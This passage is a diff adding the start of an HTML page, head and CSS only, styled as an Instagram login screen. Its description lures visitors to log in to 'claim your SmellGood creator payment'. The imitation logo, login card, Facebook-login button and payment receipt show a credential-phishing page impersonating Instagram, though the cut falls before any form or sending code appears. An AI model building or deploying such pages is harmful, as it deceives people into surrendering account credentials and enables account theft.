@@ -1,0 +1,58 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Instagram</title>
+<meta name="description" content="Log in to Instagram to claim your SmellGood creator payment.">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='9' fill='%23d62976'/%3E%3Ccircle cx='16' cy='16' r='7' fill='none' stroke='white' stroke-width='2.5'/%3E%3Ccircle cx='23.5' cy='8.5' r='2' fill='white'/%3E%3C/svg%3E">
+<style>
+*{box-sizing:border-box}
+body{margin:0;background:#fafafa;color:#262626;font:14px/1.4 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+.brandbar{background:#111;color:#f3ede2;text-align:center;font-size:10.5px;letter-spacing:.16em;text-transform:uppercase;padding:9px 12px}
+.brandbar b{color:#e8b48a;font-weight:700}
+main{min-height:calc(100vh - 120px);display:flex;flex-direction:column;align-items:center;justify-content:center;padding:34px 16px 10px}
+.card{width:100%;max-width:350px;background:#fff;border:1px solid #dbdbdb;border-radius:2px;padding:34px 40px 22px;text-align:center;margin-bottom:10px}
+.card.small{padding:20px;font-size:14px;margin-bottom:22px}
+.card.small b{color:#0095f6;font-weight:600;cursor:pointer}
+.logo{font-family:"Segoe UI",Helvetica,Arial,sans-serif;font-size:42px;font-weight:500;letter-spacing:-1.6px;margin:0 0 8px;background:linear-gradient(45deg,#f9ce34,#ee2a7b 45%,#6228d7);-webkit-background-clip:text;background-clip:text;color:transparent}
+.offer{font-size:12.5px;color:#737373;margin:0 0 22px;line-height:1.45}
+.offer b{color:#262626}
+.field{position:relative;margin-bottom:6px}
+.field input{width:100%;padding:15px 8px 5px;font-size:13px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;outline:none;font-family:inherit}
+.field input:focus{border-color:#a8a8a8}
+.field label{position:absolute;left:9px;top:11px;font-size:12px;color:#8e8e8e;transition:.1s;pointer-events:none}
+.field input:placeholder-shown+label{top:11px;font-size:13px}
+.field input:not(:placeholder-shown)+label,.field input:focus+label{top:3px;font-size:9.5px}
+.reveal{position:absolute;right:8px;top:11px;border:0;background:none;font-size:13px;font-weight:600;color:#262626;cursor:pointer;padding:0}
+.btn{width:100%;margin-top:9px;height:32px;border:0;border-radius:8px;background:#0095f6;color:#fff;font:inherit;font-size:14px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center}
+.btn:disabled{opacity:.6;cursor:default}
+.spin{width:15px;height:15px;border:2px solid rgba(255,255,255,.45);border-top-color:#fff;border-radius:50%;animation:s .7s linear infinite}
+@keyframes s{to{transform:rotate(360deg)}}
+.err{color:#ed4956;font-size:13px;margin:12px 0 0;line-height:1.35}
+.or{display:flex;align-items:center;gap:16px;margin:17px 0}
+.or::before,.or::after{content:"";flex:1;height:1px;background:#dbdbdb}
+.or span{font-size:11px;font-weight:600;color:#8e8e8e}
+.fb{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;border:0;background:none;color:#385185;font:inherit;font-size:14px;font-weight:600;cursor:pointer;margin-bottom:14px}
+.forgot{font-size:12px;color:#00376b;text-decoration:none;display:inline-block;cursor:pointer}
+.sub{font-size:13px;color:#737373;margin:0 0 18px;line-height:1.5}
+.tiny{display:inline-block;margin-top:14px;font-size:12.5px;color:#00376b;background:none;border:0;padding:0;cursor:pointer;font-family:inherit}
+.fine{font-size:10.5px;color:#8e8e8e;margin:16px 0 0;line-height:1.5}
+.done .tick{width:46px;height:46px;border-radius:50%;background:#e8f5ec;color:#2e9e5b;display:grid;place-items:center;font-size:23px;margin:0 auto 12px}
+.done h3{font-size:16px;margin:0 0 8px}
+.rcpt{border:1px solid #eee;border-radius:8px;padding:10px 12px;margin:14px 0;font-size:12.5px}
+.rcpt div{display:flex;justify-content:space-between;padding:4px 0}
+.rcpt span{color:#737373}
+.revs{width:100%;max-width:350px;font-size:13px}
+.revs summary{cursor:pointer;list-style:none;background:#fff;border:1px solid #dbdbdb;border-radius:2px;padding:12px 14px;font-weight:600;font-size:13px;display:flex;justify-content:space-between;align-items:center}
+.revs summary::-webkit-details-marker{display:none}
+.revs summary::after{content:"+";color:#8e8e8e;font-size:16px}
+.revs[open] summary::after{content:"–"}
+.revbox{max-height:260px;overflow-y:auto;background:#fff;border:1px solid #dbdbdb;border-top:0;border-radius:0 0 2px 2px;padding:4px 14px}
+.rev{padding:11px 0;border-bottom:1px solid #f0f0f0;font-size:12.5px;line-height:1.45}
+.rev:last-child{border-bottom:0}
+.rev b{display:block;font-size:12.5px}
+.rev i{font-style:normal;color:#8e8e8e;font-size:11px}
+.rev s{text-decoration:none;color:#c9a227;letter-spacing:1px;font-size:10px}
+.rev p{margin:4px 0 0;color:#3a3630}
+footer{text-align:center;font-size:11px;color:#8e8e8e;padding:26px 20px 34
